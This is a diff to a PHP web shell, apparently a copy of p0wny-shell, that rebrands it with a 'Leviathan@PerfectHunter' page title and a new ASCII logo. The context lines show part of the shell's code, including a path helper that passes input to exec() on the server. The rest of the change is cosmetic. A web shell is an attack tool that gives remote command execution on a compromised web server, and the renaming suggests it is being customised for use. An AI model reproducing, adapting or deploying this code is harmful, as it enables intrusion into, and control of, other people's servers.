@@ -1,10 +1,5 @@
 <?php
 
-
-
-
-
-
 function expandPath($path) {
     if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
         exec("echo $match[1]", $stdout);
@@ -121,7 +116,7 @@ if (isset($_GET["feature"])) {
 
     <head>
         <meta charset="UTF-8" />
-        <title>p0wny@shell:~#</title>
+        <title>Leviathan@PerfectHunter:~#</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <style>
             html, body {
@@ -496,13 +491,13 @@ if (isset($_GET["feature"])) {
         <div id="shell">
             <pre id="shell-content">
                 <div id="shell-logo">   
- _                _       _   _                   _____           __          _     _    _             _            <span></span>               
-| |              (_)     | | | |                 |  __ \         / _|        | |   | |  | |           | |           <span></span>
-| |     _____   ___  __ _| |_| |__   __ _ _ __   | |__) |__ _ __| |_ _____  _| |_  | |__| |_   _ _ __ | |_ ___ _ __ <span></span>
-| |    / _ \ \ / / |/ _` | __| '_ \ / _` | '_ \  |  ___/ _ \ '__|  _/ _ \ \/ / __| |  __  | | | | '_ \| __/ _ \ '__|<span></span>
-| |___|  __/\ V /| | (_| | |_| | | | (_| | | | | | |  |  __/ |  | ||  __/>  <| |_  | |  | | |_| | | | | ||  __/ |   <span></span>
-|______\___| \_/ |_|\__,_|\__|_| |_|\__,_|_| |_| |_|   \___|_|  |_| \___/_/\_\\__| |_|  |_|\__,_|_| |_|\__\___|_|   <span></span>
-                                                                                                                    <span></span>
+  _                _       _   _                 <span></span>               
+ | |              (_)     | | | |                <span></span>
+ | |     _____   ___  __ _| |_| |__   __ _ _ __  <span></span>
+ | |    / _ \ \ / / |/ _` | __| '_ \ / _` | '_  \ <span></span>
+ | |___|  __/\ V /| | (_| | |_| | | | (_| | | | |<span></span>
+ |______\___| \_/ |_|\__,_|\__|_| |_|\__,_|_| |_|<span></span>
+                                                 <span></span>
                 </div>
             </pre>
             <div id="shell-input">
